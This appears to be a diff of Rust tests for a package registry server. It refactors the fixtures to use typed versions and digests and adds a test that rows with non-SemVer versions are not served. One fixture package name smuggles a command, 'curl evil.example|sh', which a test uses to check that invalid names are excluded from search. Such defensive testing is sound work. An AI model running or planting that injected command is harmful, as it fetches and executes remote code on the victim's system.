@@ -4,14 +4,24 @@
     reason = "a test's unwrap is its assertion: a None or an Err fails the test"
 )]
 
-use sha2::{Digest, Sha256};
-use specforge_package::{PackageName, Version};
+use specforge_package::{PackageName, Sha256, Version};
+use specforge_registry_server::db::PackageVersion;
 use specforge_registry_server::testing::LocalRegistry;
 use specforge_registry_wire::address::Call;
 use specforge_registry_wire::{PackageMetadata, VersionList};
 
 fn tool() -> PackageName {
     PackageName::parse("@acme/tool").unwrap()
+}
+
+/// The reply of `name@version` whose binary is `wasm`.
+fn reply(name: &str, version: &str, wasm: &[u8]) -> PackageMetadata {
+    PackageMetadata::new(
+        name.parse().unwrap(),
+        version.parse().unwrap(),
+        Sha256::of(wasm),
+        "ignored",
+    )
 }
 
 fn get(url: &str) -> reqwest::blocking::Response {
@@ -23,22 +33,13 @@ fn a_stored_package_is_served_as_published() {
     let registry = LocalRegistry::start();
     let wasm: &[u8] = b"\0asm unsigned bytes";
     // The download is checked against the stored digest, so store the real one.
-    let sha256 = hex::encode(Sha256::digest(wasm));
-    registry.store(
-        &PackageMetadata {
-            name: "@acme/tool".into(),
-            version: "1.0.0".into(),
-            sha256: sha256.clone(),
-            wasm_url: "ignored".into(),
-            ..Default::default()
-        },
-        wasm,
-    );
+    let sha256 = Sha256::of(wasm);
+    registry.store(&reply("@acme/tool", "1.0.0", wasm), wasm);
 
     let list: VersionList = get(&registry.root().address(&Call::Package(&tool())))
         .json()
         .unwrap();
-    assert_eq!(list.versions, ["1.0.0"]);
+    assert_eq!(list.versions, [Version::new(1, 0, 0)]);
 
     let metadata: PackageMetadata = get(&registry
         .root()
@@ -72,19 +73,49 @@ fn a_stored_package_is_served_as_published() {
 fn versions_list_in_store_order() {
     let registry = LocalRegistry::start();
     for version in ["2.0.0", "1.0.0", "1.5.0"] {
-        registry.store(
-            &PackageMetadata {
-                name: "@acme/tool".into(),
-                version: version.into(),
-                ..Default::default()
-            },
-            b"\0asm",
-        );
+        registry.store(&reply("@acme/tool", version, b"\0asm"), b"\0asm");
     }
     let list: VersionList = get(&registry.root().address(&Call::Package(&tool())))
         .json()
         .unwrap();
-    assert_eq!(list.versions, ["2.0.0", "1.0.0", "1.5.0"]);
+    assert_eq!(
+        list.versions,
+        [
+            Version::new(2, 0, 0),
+            Version::new(1, 0, 0),
+            Version::new(1, 5, 0)
+        ]
+    );
+}
+
+#[specforge_test_macros::test(
+    behavior = "resolve_registry_source",
+    verify = "a registry lists no stored version that is no SemVer version"
+)]
+fn versions_serve_no_stored_row_whose_version_is_no_semver_version() {
+    let registry = LocalRegistry::start();
+    registry.store(&reply("@acme/tool", "1.0.0", b"\0asm"), b"\0asm");
+    registry.store_row(
+        &PackageVersion {
+            name: "@acme/tool".into(),
+            version: "v1".into(),
+            sha256: Sha256::of(b"\0asm").to_string(),
+            size_bytes: 0,
+            description: String::new(),
+            keywords: String::new(),
+            publisher: String::new(),
+            published_at: String::new(),
+            signature: None,
+            manifest: String::new(),
+        },
+        b"\0asm",
+    );
+
+    let list: VersionList = get(&registry.root().address(&Call::Package(&tool())))
+        .json()
+        .unwrap();
+
+    assert_eq!(list.versions, [Version::new(1, 0, 0)]);
 }
 
 #[test]
@@ -96,12 +127,9 @@ fn a_stored_signature_reads_back_typed() {
         .sign(&SignedContent::of("@acme/tool", "1.0.0", wasm, "{}"));
     registry.store(
         &PackageMetadata {
-            name: "@acme/tool".into(),
-            version: "1.0.0".into(),
-            sha256: hex::encode(Sha256::digest(wasm)),
             signature: Some(signature.clone()),
             manifest: "{}".into(),
-            ..Default::default()
+            ..reply("@acme/tool", "1.0.0", wasm)
         },
         wasm,
     );
@@ -124,13 +152,19 @@ fn search_serves_no_stored_row_whose_name_is_no_package_name() {
         ("@sdk/greet; curl evil.example|sh", "9.9.9"),
         ("@sdk/good", "1.0.0"),
     ] {
-        registry.store(
-            &PackageMetadata {
+        // A row from before ADR 0036: no `PackageMetadata` can hold its name.
+        registry.store_row(
+            &PackageVersion {
                 name: name.into(),
                 version: version.into(),
                 sha256: "0".into(),
-                wasm_url: "ignored".into(),
-                ..Default::default()
+                size_bytes: 0,
+                description: String::new(),
+                keywords: String::new(),
+                publisher: String::new(),
+                published_at: String::new(),
+                signature: None,
+                manifest: String::new(),
             },
             b"\0asm",
         );
